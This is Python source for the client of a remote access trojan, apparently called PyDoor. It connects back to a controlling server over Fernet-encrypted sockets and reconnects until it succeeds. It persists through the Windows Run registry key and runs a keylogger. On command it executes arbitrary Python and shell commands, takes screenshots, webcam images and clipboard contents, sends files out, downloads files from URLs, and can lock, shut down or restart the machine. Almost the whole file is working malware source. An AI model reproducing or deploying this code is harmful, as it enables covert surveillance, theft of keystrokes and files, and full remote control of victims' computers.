""" Imports """
import getpass
import json
import logging
import os
import platform
import shutil
import socket
import subprocess
import sys
import threading
import time
import traceback
from io import BytesIO, StringIO
from pydoc import help
from zipfile import ZipFile

import cv2
import psutil
import pyperclip
import pyscreeze
import requests
from cryptography.fernet import Fernet

if getattr(sys, 'frozen', False):
    CLIENT_PATH = os.path.dirname(sys.executable)
elif __file__:
    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))

os.chdir(CLIENT_PATH)
LOG = os.path.join(CLIENT_PATH, 'log.log')

if platform.system() == 'Windows':
    import ctypes
    from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue
    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
    STARTUP_REG_NAME = 'PyDoor'

try:
    from pynput.keyboard import Listener
    _PYNPUT = True
except ImportError:
    _PYNPUT = False

logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
logging.info('Client Started.')


def read_file(path: str, block_size: int = 32768) -> bytes:
    """ Generator for reading files """
    with open(path, 'rb') as f:
        while True:
            piece = f.read(block_size)
            if piece:
                yield piece
            else:
                return


def reverse_readline(filename: str, buf_size: int = 16384) -> str:
    """A generator that returns the lines of a file in reverse order"""

    # Credit: https://stackoverflow.com/a/23646049/10625567

    with open(filename) as _file:
        segment = None
        offset = 0
        _file.seek(0, os.SEEK_END)
        file_size = remaining_size = _file.tell()
        while remaining_size > 0:
            offset = min(file_size, offset + buf_size)
            _file.seek(file_size - offset)
            buffer = _file.read(min(remaining_size, buf_size))
            remaining_size -= buf_size
            lines = buffer.split('\n')
            if segment is not None:
                if buffer[-1] != '\n':
                    lines[-1] += segment
                else:
                    yield segment
            segment = lines[0]
            for index in range(len(lines) - 1, 0, -1):
                if lines[index]:
                    yield lines[index]
        if segment is not None:
            yield segment


def errors(error: Exception, line: bool = True) -> str:
    """ Error Handler """
    error_class = error.__class__.__name__
    error_msg = f'{error_class}:'
    try:
        error_msg += f' {error.args[0]}'
    except (IndexError, AttributeError):
        pass
    if line:
        try:
            _, _, traceb = sys.exc_info()
            line_number = traceback.extract_tb(traceb)[-1][1]
            error_msg += f' (line {line_number})'
        except Exception:
            pass
    return error_msg


def add_startup() -> list:
    """ Add Client to startup """
    # returns [True/False, None/error]
    if platform.system() != 'Windows':
        return 'Startup feature is only for Windows'
    if getattr(sys, 'frozen', False):
        path = sys.executable
    elif __file__:
        path = os.path.abspath(__file__)
    try:
        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_ALL_ACCESS)
        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)
        CloseKey(key)
    except Exception as error:
        return errors(error)
    logging.info('Added Client to Startup')
    return None


def remove_startup() -> list:
    """ Remove Client from Startup """
    # returns [True/False, None/error]
    if platform.system() != 'Windows':
        return 'Startup feature is only for Windows'
    try:
        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_ALL_ACCESS)
        DeleteValue(key, STARTUP_REG_NAME)
        CloseKey(key)
    except FileNotFoundError:
        # File was never registered.
        # Still returns True, since it's not in startup
        pass
    except WindowsError as error:
        return errors(error)
    logging.info('Removed Client from Startup')
    return None


def kill(pid: int) -> None:
    """ Kill Process by ID """
    process = psutil.Process(pid)
    for proc in process.children(recursive=True):
        proc.kill()
    process.kill()


def onkeyboardevent(event):
    """ On Keyboard Event"""
    logging.info("%s", event)

if _PYNPUT:
    KeyListener = Listener(on_press=onkeyboardevent)
    # Check the state of the keylogger from logs
    if os.path.isfile(LOG):
        for _line in reverse_readline(LOG):
            if 'Started Keylogger' in _line:
                KeyListener.start()
                break
            if 'Stopped Keylogger' in _line:
                break


class Client(object):
    """ Client Object """

    def __init__(self, key: bytes, host: str = '127.0.0.1', port: int = 8000) -> None:
        self.serverhost = host
        self.serverport = port
        self.socket = None
        self.fer = Fernet(key)
        if platform.system() == 'Windows':
            self._pwd = ' & cd'
        else:
            self._pwd = '; pwd'

    def connect(self) -> None:
        """ Connect to a remote socket """
        try:
            self.socket = socket.socket()
            self.socket.connect((self.serverhost, self.serverport))
        except (ConnectionRefusedError, TimeoutError):
            raise
        except Exception as error:
            logging.error(errors(error))
            raise
        try:
            self.socket.send(socket.gethostname().encode())
        except socket.error as error:
            logging.error(errors(error))

    def recvall(self, byteamount: int) -> bytes:
        """ Function to receive n amount of bytes"""
        # returns bytes/None
        data = b''
        while len(data) < byteamount:
            data += self.socket.recv(byteamount - len(data))
        return data

    def receive(self) -> bytes:
        """ Receives Buffer Size and Data from Server Encrypted with AES """
        # returns bytes
        buffer = int(self.socket.recv(2048).decode())
        self.socket.send(b'RECEIVED')
        return self.fer.decrypt(self.recvall(buffer))

    def send(self, data: bytes) -> None:
        """ Sends Buffer Size and Data to Server Encrypted with AES """
        # returns None
        encrypted = self.fer.encrypt(data)
        self.socket.send(f"{len(encrypted)}".encode())
        self.socket.recv(1024)
        self.socket.send(encrypted)

    def send_json(self, data: not bytes) -> None:
        """ Send JSON data to Server """
        self.send(json.dumps(data).encode())

    def check_perms(self, _file: str, mode: str) -> bool:
        """ Check permissions to a file """
        try:
            with open(_file, mode):
                pass
        except Exception as error:
            self.send(b'FILE_TRANSFER_ERROR')
            self.receive()
            self.send(errors(error).encode())
            return False
        return True

    def send_file(self, file_to_transfer: str) -> None:
        """ Send file to Server """
        # returns None
        if not self.check_perms(file_to_transfer, 'rb'):
            return
        for block in read_file(file_to_transfer):
            self.send(block)
            self.receive()
        self.send(b'FILE_TRANSFER_DONE')
        self.receive()
        self.send(b'File Transferred Successfully')
        logging.info('Transferred %s to Server', file_to_transfer)

    def receive_file(self, save_as: str) -> None:
        """ Receive File from Server"""
        # returns None
        if not self.check_perms(save_as, 'wb'):
            return
        self.send(b'RECEIVED')
        with open(save_as, 'wb') as _file:
            while 1:
                data = self.receive()
                if data == b'FILE_TRANSFER_DONE':
                    self.send(b'File Transferred Successfully')
                    break
                _file.write(data)
                self.send(b'RECEIVED')
        logging.info('Transferred %s to Client', save_as)

    def receive_commands(self) -> None:
        """ Receives Commands from Server """
        while True:
            data = json.loads(self.receive().decode())

            if data[0] == 'GETCWD':
                self.send(os.getcwdb())
                continue

            if data[0] == 'LIST':
                continue

            if data[0] == 'PLATFORM':
                self.send(platform.system().encode())
                continue

            if data[0] == 'LOG_FILE':
                self.send(LOG.encode())
                continue

            if data[0] == '_INFO':
                self.send_json([platform.system(), os.path.expanduser('~'), getpass.getuser()])
                continue

            if data[0] == 'FROZEN':
                self.send_json(getattr(sys, 'frozen', False))
                continue

            if data[0] == 'EXEC':
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()
                error = None
                try:
                    exec(data[1])
                except Exception as err:
                    error = errors(err, line=False)
                finally:
                    sys.stdout = old_stdout
                self.send_json([redirected_output.getvalue(), error])
                continue

            if data[0] == 'RESTART_SESSION':
                self.send_json(True)
                break

            if data[0] == 'CLOSE':
                self.send_json(True)
                self.socket.close()
                sys.exit(0)

            if data[0] == 'ADD_STARTUP':
                self.send_json(add_startup())
                continue

            if data[0] == 'REMOVE_STARTUP':
                self.send_json(remove_startup())
                continue

            if data[0] == 'LOCK':
                if platform.system() == 'Windows':
                    self.send_json(True)
                    ctypes.windll.user32.LockWorkStation()
                else:
                    self.send_json(False)
                continue

            if data[0] == 'SHUTDOWN':
                if platform.system() != 'Windows':
                    self.send_json(False)
                    continue
                self.send_json(True)
                subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RESTART':
                if platform.system() != 'Windows':
                    self.send_json(False)
                    continue
                self.send_json(True)
                subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RECEIVE_FILE':
                self.send_file(data[1])
                continue

            if data[0] == 'SEND_FILE':
                self.receive_file(data[1])
                continue

            if data[0] == 'ZIP_FILE':
                logging.info('Zipping File: %s', data[2])
                try:
                    with ZipFile(data[1], 'w') as ziph:
                        ziph.write(data[2])
                except Exception as err:
                    self.send_json(errors(err))
                    continue
                self.send_json(None)
                continue

            if data[0] == 'ZIP_DIR':
                logging.info('Zipping Folder: %s', data[2])
                try:
                    shutil.make_archive(data[1], 'zip', data[2])
                except Exception as err:
                    self.send_json(errors(err))
                    continue
                self.send_json(None)
                continue

            if data[0] == 'UNZIP':
                logging.info('Unzipping: %s', data[1])
                try:
                    with ZipFile(data[1], 'r') as ziph:
                        ziph.extractall()
                except Exception as err:
                    self.send_json(errors(err))
                    continue
                self.send_json(None)
                continue

            if data[0] == 'DOWNLOAD':
                logging.info('Downloading "%s" from %s', data[2], data[1])
                try:
                    request = requests.get(data[1])
                    with open(data[2], 'wb') as _file:
                        _file.write(request.content)
                except Exception as err:
                    self.send_json(errors(err, line=False))
                    continue
                self.send_json(None)
                continue

            if data[0] == 'INFO':
                self.send(f'User: {getpass.getuser()}\n' \
                    f'OS: {platform.system()} {platform.release()} ' \
                    f'({platform.platform()}) ({platform.machine()})\n' \
                    f'Frozen (.exe): {getattr(sys, "frozen", False)}\n'.encode())
                continue

            if data[0] == 'SCREENSHOT':
                logging.info('Taking Screenshot')
                try:
                    with BytesIO() as output:
                        img = pyscreeze.screenshot()
                        img.save(output, format='PNG')
                        content = output.getvalue()
                except Exception as err:
                    self.send(b'ERROR')
                    self.receive()
                    self.send(errors(err).encode())
                    continue
                self.send(content)
                continue

            if data[0] == 'WEBCAM':
                logging.info('Capturing Webcam')
                camera = cv2.VideoCapture(0)
                state, img = camera.read()
                camera.release()
                if state:
                    is_success, arr = cv2.imencode('.png', img)
                    if is_success:
                        self.send(arr.tobytes())
                        continue
                logging.info('WebcamCaptureError')
                self.send(b'ERROR')
                continue

            if data[0] == 'START_KEYLOGGER':
                if not _PYNPUT:
                    self.send_json(False)
                    continue
                if not KeyListener.running:
                    KeyListener.start()
                    logging.info('Started Keylogger')
                self.send_json(True)
                continue

            if data[0] == 'KEYLOGGER_STATUS':
                if not _PYNPUT or not KeyListener.running:
                    self.send_json(False)
                    continue
                self.send_json(True)
                continue

            if data[0] == 'STOP_KEYLOGGER':
                if not _PYNPUT:
                    self.send_json(False)
                    continue
                if KeyListener.running:
                    logging.info('Stopped Keylogger')
                    KeyListener.stop()
                    threading.Thread.__init__(KeyListener) # re-initialise thread
                self.send_json(True)
                continue

            if data[0] == 'COPY':
                try:
                    pyperclip.copy(data[1])
                except pyperclip.PyperclipException as err:
                    self.send_json(errors(err))
                    continue
                self.send_json(None)
                continue

            if data[0] == 'PASTE':
                try:
                    clipboard = pyperclip.paste()
                except pyperclip.PyperclipException as err:
                    self.send_json([False, errors(err)])
                    continue
                self.send_json([True, clipboard])
                continue

            if data[0] == 'SHELL':
                split_command = data[1].split(' ')[0].strip().lower()
                if split_command in ['cd', 'chdir']:
                    process = subprocess.Popen(data[1] + self._pwd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    error = process.stderr.read().decode()
                    if error == "":
                        output = process.stdout.read().decode()
                        newlines = output.count('\n')
                        # Command should only return one line (cwd)
                        if newlines > 1:
                            process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            self.send_json(['ERROR', process.stdout.read().decode()])
                            continue
                        os.chdir(output.strip())
                        self.send_json([os.getcwd()])
                        continue
                    self.send_json(['ERROR', error])
                    continue

                process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                for line in iter(process.stdout.readline, ""):
                    if line == b'':
                        break
                    self.send(line.replace(b'\n', b''))
                    if self.receive() == b'QUIT':
                        kill(process.pid)
                        break
                self.send(process.stderr.read())
                self.receive()
                self.send(b'DONE')
                continue


def main(key: bytes, retry_timer: int = 10) -> None:
    """ Run Client """
    # RETRY_TIMER: Time to wait before trying to reconnect
    client = Client(key)
    while True:
        try:
            client.connect()
        except Exception:
            time.sleep(retry_timer)
        else:
            break
    try:
        client.receive_commands()
    except Exception as err:
        logging.critical(errors(err))


if __name__ == '__main__':

    # Add Client to Startup when Client is run
    # add_startup()
    while 1:
        main(b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
